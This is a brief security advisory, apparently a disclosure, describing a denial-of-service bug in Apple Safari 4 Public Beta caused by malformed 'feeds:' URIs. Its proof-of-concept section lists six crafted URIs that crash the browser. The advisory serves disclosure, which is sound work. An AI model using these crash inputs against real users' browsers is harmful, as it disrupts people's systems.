Service Vulnerability

Class:    Input Validation Error
Local:    Yes
Remote:    Yes
Vulnerable Versions:
    * Apple Safari 4 (528.16) Public Beta

Note: MacOS X versions not tested.

Description:
Apple Safari is prone to a denial-of-service vulnerability, caused by a
NULL pointer defernce bug, because it fails to adequately sanitize
user-supplied input within afeeds: URI.
Attackers can exploit this issue to cause denial-of-service conditions
on a users computer and crash the Safari process.

Proof-of-Concept:
feeds:%&www.rec-sec.com/feed/
feeds:{&www.rec-sec.com/feed/
feeds:}&www.rec-sec.com/feed/
feeds:^&www.rec-sec.com/feed/
feeds:`&www.rec-sec.com/feed/
feeds:|&www.rec-sec.com/feed/

Any feeds: URI containing one of these characters will cause a
denial-of-service condition.

Vendor has been informed.

Solution:
No solution.
